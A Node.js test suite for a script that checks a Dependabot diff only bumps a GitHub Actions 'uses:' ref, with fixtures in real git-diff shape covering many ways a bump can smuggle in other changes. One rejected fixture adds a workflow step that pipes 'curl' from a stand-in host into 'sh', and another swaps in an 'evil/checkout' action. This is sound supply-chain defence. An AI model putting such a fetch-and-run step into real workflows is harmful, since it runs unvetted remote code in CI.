'use strict';

// scripts/check-bump-diff.js — the mechanical "uses:-only" check the operator
// ruled ADR 0014's Dependabot exemption must rest on (#1361).
//
// Fixtures are built in the exact shape `git diff` / `gh pr diff` print (captured
// from a real bump of this repo's test.yml), because a hand-simplified diff is a
// fixture the parser can agree with while the real one slips past it.

const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const { spawnSync } = require('node:child_process');
const { checkBumpDiff } = require('../scripts/check-bump-diff');

const SCRIPT = path.join(__dirname, '..', 'scripts', 'check-bump-diff.js');

/**
 * Build one file's section of a unified diff in `git diff`'s real shape.
 * @param {string} file - Repo-relative path.
 * @param {string[]} body - Hunk body lines, each already prefixed with ' ', '-' or '+'.
 * @param {object} [opts]
 * @param {string} [opts.b] - Destination path, for a rename.
 * @param {string[]} [opts.meta] - Extended header lines (e.g. 'new file mode 100644').
 * @returns {string}
 */
function fileDiff(file, body, opts = {}) {
  const b = opts.b || file;
  return [
    `diff --git a/${file} b/${b}`,
    ...(opts.meta || []),
    'index 18ee7255..d94e8940 100644',
    `--- a/${file}`,
    `+++ b/${b}`,
    '@@ -13,7 +13,7 @@ jobs:',
    ...body
  ].join('\n') + '\n';
}

const CTX_BEFORE = ['   test:', '     runs-on: ubuntu-latest', '     steps:'];
const CTX_AFTER = ['         with:', '           fetch-depth: 0'];

/**
 * A real-shaped single-line bump of one `uses:` step.
 * @param {string} file
 * @param {string} from
 * @param {string} to
 * @param {string} [action]
 * @returns {string}
 */
function bump(file, from, to, action = 'actions/checkout') {
  return fileDiff(file, [
    ...CTX_BEFORE,
    `-      - uses: ${action}@${from}`,
    `+      - uses: ${action}@${to}`,
    ...CTX_AFTER
  ]);
}

describe('check-bump-diff', () => {
  describe('passes a bump and nothing else', () => {
    it('a one-line bump', () => {
      const r = checkBumpDiff(bump('.github/workflows/test.yml', 'v7', 'v8'));
      assert.equal(r.ok, true, r.reason);
      assert.equal(r.action, 'actions/checkout');
      assert.deepEqual(r.from, ['v7']);
      assert.equal(r.to, 'v8');
    });

    it('the same action bumped across several workflow files', () => {
      const d = bump('.github/workflows/test.yml', 'v7', 'v8')
        + bump('.github/workflows/release.yml', 'v7', 'v8')
        + bump('.github/workflows/upstream-drift.yml', 'v6', 'v8');
      const r = checkBumpDiff(d);
      assert.equal(r.ok, true, r.reason);
      assert.deepEqual(r.from.sort(), ['v6', 'v7']);
    });

    it('a SHA-pinned ref with its trailing version comment', () => {
      const d = fileDiff('.github/workflows/test.yml', [
        ...CTX_BEFORE,
        '-      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2',
        '+      - uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0',
        ...CTX_AFTER
      ]);
      assert.equal(checkBumpDiff(d).ok, true);
    });

    it('two adjacent uses: lines, as git groups them (removed block, then added block)', () => {
      // Captured from a real `git diff` of two consecutive steps both bumped.
      const d = fileDiff('.github/workflows/test.yml', [
        '     steps:',
        '-      - uses: actions/checkout@v7',
        '-      - uses: actions/checkout@v7',
        '+      - uses: actions/checkout@v8',
        '+      - uses: actions/checkout@v8',
        '         with:'
      ]);
      assert.equal(checkBumpDiff(d).ok, true, checkBumpDiff(d).reason);
    });

    it('a .yaml workflow and a sub-path action', () => {
      const d = bump('.github/workflows/ci.yaml', 'v3', 'v4', 'github/codeql-action/init');
      assert.equal(checkBumpDiff(d).ok, true);
    });
  });

  describe('fails anything beyond the ref', () => {
    const cases = {
      'an added run: step beside the bump': fileDiff('.github/workflows/test.yml', [
        ...CTX_BEFORE,
        '-      - uses: actions/checkout@v7',
        '+      - uses: actions/checkout@v8',
        '+      - run: curl -s https://example.invalid | sh',
        ...CTX_AFTER
      ]),
      'a changed with: input': fileDiff('.github/workflows/test.yml', [
        '-      - uses: actions/checkout@v7',
        '+      - uses: actions/checkout@v8',
        '         with:',
        '-          fetch-depth: 0',
        '+          fetch-depth: 1'
      ]),
      'a widened permissions: block': fileDiff('.github/workflows/test.yml', [
        '-  contents: read',
        '+  contents: write',
        '-      - uses: actions/checkout@v7',
        '+      - uses: actions/checkout@v8'
      ]),
      'a comment-only change': fileDiff('.github/workflows/test.yml', [
        '-      # pinned for #1361',
        '+      # pinned for #1362'
      ]),
      'a free-text trailing comment on the uses: line': fileDiff('.github/workflows/test.yml', [
        '-      - uses: actions/checkout@v7',
        '+      - uses: actions/checkout@v8 # see https://example.invalid'
      ]),
      'a second step using the same action': fileDiff('.github/workflows/test.yml', [
        '-      - uses: actions/checkout@v7',
        '+      - uses: actions/checkout@v8',
        '+      - uses: actions/checkout@v8'
      ]),
      'a re-indented step': fileDiff('.github/workflows/test.yml', [
        '-      - uses: actions/checkout@v7',
        '+        - uses: actions/checkout@v8'
      ]),
      'two different actions': bump('.github/workflows/test.yml', 'v7', 'v8')
        + bump('.github/workflows/release.yml', 'v4', 'v5', 'actions/setup-node'),
      'two actions moved to the same ref (Dependabot does not group here)': bump('.github/workflows/test.yml', 'v7', 'v8')
        + bump('.github/workflows/release.yml', 'v7', 'v8', 'actions/setup-node'),
      'an action swapped for another': fileDiff('.github/workflows/test.yml', [
        '-      - uses: actions/checkout@v7',
        '+      - uses: evil/checkout@v7'
      ]),
      'two different target refs': bump('.github/workflows/test.yml', 'v7', 'v8')
        + bump('.github/workflows/release.yml', 'v7', 'v9'),
      'a new ref that is also an old ref': bump('.github/workflows/test.yml', 'v7', 'v8')
        + bump('.github/workflows/release.yml', 'v8', 'v8'),
      'a file outside .github/workflows/': bump('scripts/release.yml', 'v7', 'v8'),
      'a nested path under workflows/': bump('.github/workflows/sub/test.yml', 'v7', 'v8'),
      'a renamed workflow': fileDiff('.github/workflows/test.yml', [
        '-      - uses: actions/checkout@v7',
        '+      - uses: actions/checkout@v8'
      ], { b: '.github/workflows/test2.yml' }),
      'a new workflow file': fileDiff('.github/workflows/new.yml', [
        '+      - uses: actions/checkout@v8'
      ], { meta: ['new file mode 100644'] }),
      'a mode change': bump('.github/workflows/test.yml', 'v7', 'v8').replace('\nindex ', '\nold mode 100644\nnew mode 100755\nindex '),
      'a uses: line moved to another step': fileDiff('.github/workflows/test.yml', [
        '-      - uses: actions/checkout@v7',
        '       - run: npm test',
        '+      - uses: actions/checkout@v8'
      ]),
      'a uses: line moved to another hunk': fileDiff('.github/workflows/test.yml', [
        '-      - uses: actions/checkout@v7',
        '       - run: echo one',
        '@@ -40,3 +40,4 @@ jobs:',
        '       - run: echo two',
        '+      - uses: actions/checkout@v8'
      ]),
      'a quoted path header before any bump (git quotes unusual paths)':
        'diff --git "a/.github/workflows/t\\303\\251st.yml" "b/.github/workflows/t\\303\\251st.yml"\n'
        + bump('.github/workflows/test.yml', 'v7', 'v8').split('\n').slice(1).join('\n'),
      'a spaced-path file after a real bump (captured from git)': bump('.github/workflows/test.yml', 'v7', 'v8')
        + 'diff --git a/we ird.txt b/we ird.txt\nindex 587be6b..b77b4eb 100644\n--- a/we ird.txt\t\n+++ b/we ird.txt\t\n@@ -1 +1,2 @@\n x\n+y\n',
      'a quoted non-workflow path after a real bump, carrying a bump-shaped change': bump('.github/workflows/test.yml', 'v7', 'v8')
        + 'diff --git "a/scripts/r\\303\\251lease.yml" "b/scripts/r\\303\\251lease.yml"\n'
        + '@@ -1,1 +1,1 @@\n-      - uses: actions/checkout@v7\n+      - uses: actions/checkout@v8\n',
      'a hunk ending in a removal and the next hunk opening with an addition': fileDiff('.github/workflows/test.yml', [
        '       - run: echo one',
        '-      - uses: actions/checkout@v7',
        '@@ -40,3 +40,3 @@ jobs:',
        '+      - uses: actions/checkout@v8',
        '       - run: echo two'
      ]),
      'a stray line before the first file header': 'Subject: bump\n' + bump('.github/workflows/test.yml', 'v7', 'v8'),
      'an unrecognised line inside a hunk': fileDiff('.github/workflows/test.yml', [
        '-      - uses: actions/checkout@v7',
        '+      - uses: actions/checkout@v8',
        '?unknown'
      ]),
      'an empty diff': ''
    };
    for (const [name, diff] of Object.entries(cases)) {
      it(name, () => {
        const r = checkBumpDiff(diff);
        assert.equal(r.ok, false, `${name} passed as a bump`);
        assert.ok(r.reason, 'a refusal names its reason');
      });
    }
  });

  describe('CLI', () => {
    /**
     * Run the script with a diff on stdin.
     * @param {string} input
     * @returns {import('node:child_process').SpawnSyncReturns<string>}
     */
    const cli = (input) => spawnSync(process.execPath, [SCRIPT], { input, encoding: 'utf8' });

    it('exits 0 and names the bump', () => {
      const r = cli(bump('.github/workflows/test.yml', 'v7', 'v8'));
      assert.equal(r.status, 0);
      assert.match(r.stdout, /BUMP-ONLY: actions\/checkout v7 → v8/);
    });

    it('exits 1 with the reason for a non-bump', () => {
      const r = cli(bump('scripts/x.yml', 'v7', 'v8'));
      assert.equal(r.status, 1);
      assert.match(r.stderr, /NOT BUMP-ONLY: .*not a workflow file/);
    });

    it('exits 2 on empty stdin, never 0', () => {
      const r = cli('');
      assert.equal(r.status, 2);
    });
  });
});
